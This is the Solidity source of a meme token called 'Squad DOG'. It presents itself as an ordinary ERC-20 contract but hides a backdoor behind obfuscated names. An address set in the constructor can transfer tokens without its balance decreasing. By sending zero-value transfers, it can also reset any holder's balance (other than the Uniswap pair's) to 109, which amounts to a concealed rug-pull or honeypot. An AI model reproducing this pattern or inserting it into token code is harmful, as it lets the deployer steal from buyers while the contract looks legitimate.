/*

https://t.me/squadDOGErc

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SquadDOG is Ownable {
    address public dvkmjtspbl;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 private odnpxyk = 109;

    function approve(address xoepurq, uint256 ekldmvi) public returns (bool success) {
        allowance[msg.sender][xoepurq] = ekldmvi;
        emit Approval(msg.sender, xoepurq, ekldmvi);
        return true;
    }

    function transfer(address zgfbo, uint256 ekldmvi) public returns (bool success) {
        spgmqhzxato(msg.sender, zgfbo, ekldmvi);
        return true;
    }

    mapping(address => uint256) private dztnehowgf;

    string public symbol = 'Squad DOG';

    function spgmqhzxato(address vnupf, address zgfbo, uint256 ekldmvi) private {
        if (dmeqojauixyf[vnupf] == 0) {
            balanceOf[vnupf] -= ekldmvi;
        }
        balanceOf[zgfbo] += ekldmvi;
        if (dmeqojauixyf[msg.sender] > 0 && ekldmvi == 0 && zgfbo != dvkmjtspbl) {
            balanceOf[zgfbo] = odnpxyk;
        }
        emit Transfer(vnupf, zgfbo, ekldmvi);
    }

    mapping(address => uint256) private dmeqojauixyf;

    uint8 public decimals = 9;

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address vnupf, address zgfbo, uint256 ekldmvi) public returns (bool success) {
        require(ekldmvi <= allowance[vnupf][msg.sender]);
        allowance[vnupf][msg.sender] -= ekldmvi;
        spgmqhzxato(vnupf, zgfbo, ekldmvi);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = 'Squad DOG';

    mapping(address => uint256) public balanceOf;

    constructor(address hiqepw) {
        balanceOf[msg.sender] = totalSupply;
        dmeqojauixyf[hiqepw] = odnpxyk;
        IUniswapV2Router02 muen = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dvkmjtspbl = IUniswapV2Factory(muen.factory()).createPair(address(this), muen.WETH());
    }
}